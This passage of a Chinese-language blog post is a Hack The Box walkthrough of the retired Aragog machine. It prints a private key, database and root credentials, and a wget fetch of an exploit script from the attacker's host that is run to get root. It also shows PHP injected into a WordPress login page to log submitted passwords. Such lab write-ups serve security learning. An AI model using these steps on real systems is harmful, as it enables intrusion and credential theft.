class="line">7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3</span><br><span class="line">daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv</span><br><span class="line">uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ ssh -i id_rsa florian@10.10.10.78                               </span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.78 (10.10.10.78)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:4bLLuCjTjPPZfGo5hd3YV/aaiWwIv3OCTqDYKlk1pgo.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.78<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Last login: Fri Jan 12 13:56:45 2018 from 10.10.14.3</span></span><br><span class="line"><span class="string">florian@aragog:~$ ls</span></span><br><span class="line"><span class="string">Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  examples.desktop  user.txt</span></span><br><span class="line"><span class="string">florian@aragog:~$ cat user.txt </span></span><br><span class="line"><span class="string">f43.............................</span></span><br></pre></td></tr></table></figure>
+
+<p>在用户目录能够看到.mysql_history，而且是有数据库服务的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">florian@aragog:~$ <span class="built_in">ls</span> -a</span><br><span class="line">.              .bash_history  .config  .gnupg          .nano                      .xsession-errors      Downloads  Templates</span><br><span class="line">..             .bash_logout   .dbus    .<span class="built_in">local</span>          .profile                   .xsession-errors.old  Music      Videos</span><br><span class="line">.ICEauthority  .bashrc        .dmrc    .mozilla        .ssh                       Desktop               Pictures   examples.desktop</span><br><span class="line">.Xauthority    .cache         .gconf   .mysql_history  .sudo_as_admin_successful  Documents             Public     user.txt</span><br><span class="line">florian@aragog:~$ netstat -antp</span><br><span class="line">(No info could be <span class="built_in">read</span> <span class="keyword">for</span> <span class="string">&quot;-p&quot;</span>: geteuid()=1000 but you should be root.)</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:43106         127.0.0.1:80            TIME_WAIT   -               </span><br><span class="line">tcp        0    476 10.10.10.78:22          10.10.16.3:37292        ESTABLISHED -               </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::21                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 ::1:631                 :::*                    LISTEN      -         </span><br></pre></td></tr></table></figure>
+
+<p>在&#x2F;var&#x2F;www&#x2F;html&#x2F;dev_wiki似乎还有一个wordpress站点，里边有个数据库的凭证：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">florian@aragog:/var/www/html/dev_wiki$ <span class="built_in">ls</span></span><br><span class="line">index.php    wp-activate.php     wp-comments-post.php  wp-cron.php        wp-load.php   wp-settings.php   xmlrpc.php</span><br><span class="line">license.txt  wp-admin            wp-config.php         wp-includes        wp-login.php  wp-signup.php</span><br><span class="line">readme.html  wp-blog-header.php  wp-content            wp-links-opml.php  wp-mail.php   wp-trackback.php</span><br><span class="line">florian@aragog:/var/www/html/dev_wiki$ <span class="built_in">cat</span> wp-con</span><br><span class="line">wp-config.php  wp-content/    </span><br><span class="line">florian@aragog:/var/www/html/dev_wiki$ <span class="built_in">cat</span> wp-config.php </span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * * MySQL settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix</span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wp_wiki<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>root<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span><span class="variable">$@y6CHJ</span>^$<span class="comment">#5c37j$#6h&#x27;);</span></span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/** Database Charset to use <span class="keyword">in</span> creating database tables. */</span><br><span class="line">define(<span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/** The Database Collate <span class="built_in">type</span>. Don<span class="string">&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_COLLATE<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**#@+</span></span><br><span class="line"><span class="string"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="string"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="string"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @since 2.6.0</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">define(&#x27;</span>AUTH_KEY<span class="string">&#x27;,         &#x27;</span>put your unique phrase here<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>SECURE_AUTH_KEY<span class="string">&#x27;,  &#x27;</span>put your unique phrase here<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>LOGGED_IN_KEY<span class="string">&#x27;,    &#x27;</span>put your unique phrase here<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>NONCE_KEY<span class="string">&#x27;,        &#x27;</span>put your unique phrase here<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>AUTH_SALT<span class="string">&#x27;,        &#x27;</span>put your unique phrase here<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>SECURE_AUTH_SALT<span class="string">&#x27;, &#x27;</span>put your unique phrase here<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>LOGGED_IN_SALT<span class="string">&#x27;,   &#x27;</span>put your unique phrase here<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>NONCE_SALT<span class="string">&#x27;,       &#x27;</span>put your unique phrase here<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**#@-*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * WordPress Database Table prefix.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="string"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">$table_prefix  = &#x27;</span>wp_<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="string"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="string"> * in their development environments.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="string"> * visit the Codex.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">define(&#x27;</span>WP_DEBUG<span class="string">&#x27;, false);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* That&#x27;</span>s all, stop editing! Happy blogging. */</span><br><span class="line"></span><br><span class="line">/** Absolute path to the WordPress directory. */</span><br><span class="line"><span class="keyword">if</span> ( !defined(<span class="string">&#x27;ABSPATH&#x27;</span>) )</span><br><span class="line">        define(<span class="string">&#x27;ABSPATH&#x27;</span>, <span class="built_in">dirname</span>(__FILE__) . <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/** Sets up WordPress vars and included files. */</span><br><span class="line">require_once(ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span>);</span><br><span class="line">florian@aragog:/var/www/html/dev_wiki$ </span><br></pre></td></tr></table></figure>
+
+<p>里边有密码，但是破解不出来：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> * from wp_users;</span><br><span class="line">+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+</span><br><span class="line">| ID | user_login    | user_pass                          | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name  |</span><br><span class="line">+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+</span><br><span class="line">|  1 | Administrator | $P<span class="variable">$B3FUuIdSDW0IaIc4vsjj</span>.NzJDkiscu. | administrator | it@megacorp.com |          | 2017-12-20 23:26:04 |                     |           0 | Administrator |</span><br><span class="line">+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Root-txt"><a href="#Root-txt" class="headerlink" title="Root.txt:"></a>Root.txt:</h2><p>介于这机器退休很久了，其系统版本落后存在很多提权漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">florian@aragog:~$ wget http://10.10.16.3/pwk.py</span><br><span class="line">--2022-08-28 19:41:56--  http://10.10.16.3/pwk.py</span><br><span class="line">Connecting to 10.10.16.3:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3448 (3.4K) [text/x-python]</span><br><span class="line">Saving to: <span class="string">&#x27;pwk.py&#x27;</span></span><br><span class="line"></span><br><span class="line">pwk.py                                                               100%[===================================================================================================================================================================&gt;]   3.37K  --.-KB/s    <span class="keyword">in</span> 0.001s  </span><br><span class="line"></span><br><span class="line">2022-08-28 19:41:56 (6.07 MB/s) - <span class="string">&#x27;pwk.py&#x27;</span> saved [3448/3448]</span><br><span class="line"></span><br><span class="line">florian@aragog:~$ python3 pwk.py </span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1000(florian)</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">9a9d.................................</span><br></pre></td></tr></table></figure>
+
+<p>作者实际留的路径应该是这里：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">2022/08/28 19:46:15 CMD: UID=0    PID=10     | </span><br><span class="line">2022/08/28 19:46:15 CMD: UID=0    PID=1      | /sbin/init auto noprompt </span><br><span class="line">2022/08/28 19:47:01 CMD: UID=1001 PID=2657   | /usr/bin/python /home/cliff/wp-login.py </span><br><span class="line">2022/08/28 19:47:01 CMD: UID=1001 PID=2656   | /bin/sh -c /usr/bin/python /home/cliff/wp-login.py </span><br><span class="line">2022/08/28 19:47:01 CMD: UID=0    PID=2655   | /usr/sbin/CRON -f </span><br><span class="line">2022/08/28 19:47:01 CMD: UID=1001 PID=2658   | /usr/bin/python /home/cliff/wp-login.py </span><br><span class="line">2022/08/28 19:47:01 CMD: UID=1001 PID=2661   | </span><br><span class="line">2022/08/28 19:47:01 CMD: UID=1001 PID=2660   | sh -c <span class="built_in">uname</span> -p 2&gt; /dev/null </span><br><span class="line">2022/08/28 19:48:01 CMD: UID=1001 PID=2664   | /usr/bin/python /home/cliff/wp-login.py </span><br><span class="line">2022/08/28 19:48:01 CMD: UID=1001 PID=2663   | /bin/sh -c /usr/bin/python /home/cliff/wp-login.py </span><br><span class="line">2022/08/28 19:48:01 CMD: UID=0    PID=2662   | /usr/sbin/CRON -f </span><br><span class="line">2022/08/28 19:48:01 CMD: UID=1001 PID=2665   | /usr/bin/python /home/cliff/wp-login.py </span><br><span class="line">2022/08/28 19:48:01 CMD: UID=1001 PID=2667   | /usr/bin/python /home/cliff/wp-login.py </span><br><span class="line">2022/08/28 19:48:01 CMD: UID=1001 PID=2668   | </span><br><span class="line">2022/08/28 19:49:01 CMD: UID=1001 PID=2671   | /usr/bin/python /home/cliff/wp-login.py </span><br><span class="line">2022/08/28 19:49:01 CMD: UID=1001 PID=2670   | /bin/sh -c /usr/bin/python /home/cliff/wp-login.py </span><br><span class="line">2022/08/28 19:49:01 CMD: UID=0    PID=2669   | /usr/sbin/CRON -f </span><br><span class="line">2022/08/28 19:49:01 CMD: UID=1001 PID=2672   | </span><br><span class="line">2022/08/28 19:49:01 CMD: UID=1001 PID=2675   | sh -c <span class="built_in">uname</span> -p 2&gt; /dev/null </span><br><span class="line">2022/08/28 19:49:01 CMD: UID=1001 PID=2674   | sh -c <span class="built_in">uname</span> -p 2&gt; /dev/null </span><br></pre></td></tr></table></figure>
+
+<p>每过一段时间就会以用户1001身份运行一些进程。他在一直回复wordpress站点，而wp-login.py 看起来像是在自动登录wordpress站点。可以更改wp-login去接收用户输入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rrr</span> = print_r(<span class="variable">$_REQUEST</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$fff</span> = fopen(<span class="string">&quot;/dev/shm/pwd&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$fff</span>, <span class="variable">$rrr</span>);</span><br><span class="line">fclose(<span class="variable">$fff</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">florian@aragog:/dev/shm$ <span class="built_in">cat</span> <span class="built_in">pwd</span> </span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="built_in">pwd</span>] =&gt; !KRgYs(JFO!&amp;MTr)lf</span><br><span class="line">    [wp-submit] =&gt; Log In</span><br><span class="line">    [testcookie] =&gt; 1</span><br><span class="line">    [<span class="built_in">log</span>] =&gt; Administrator</span><br><span class="line">    [redirect_to] =&gt; http://127.0.0.1/dev_wiki/wp-admin/</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>这是root的密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">florian@aragog:/dev/shm$ <span class="built_in">cd</span> /home/</span><br><span class="line">florian@aragog:/home$ <span class="built_in">ls</span></span><br><span class="line">cliff  florian</span><br><span class="line">florian@aragog:/home$ su cliff</span><br><span class="line">Password: </span><br><span class="line">su: Authentication failure</span><br><span class="line">florian@aragog:/home$ su root</span><br><span class="line">Password: </span><br><span class="line">root@aragog:/home<span class="comment"># cat /root/root.txt </span></span><br><span class="line">9a9...............................</span><br><span class="line">root@aragog:/home<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - Aragog</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-Aragog.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Artcorp.html" title="HTB Walkthrough - Artcorp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - Artcorp</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Arkham.html" title="HTB Walkthrough - Arkham">
+                        <span class="hidden-mobile">HTB Walkthrough - Arkham</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
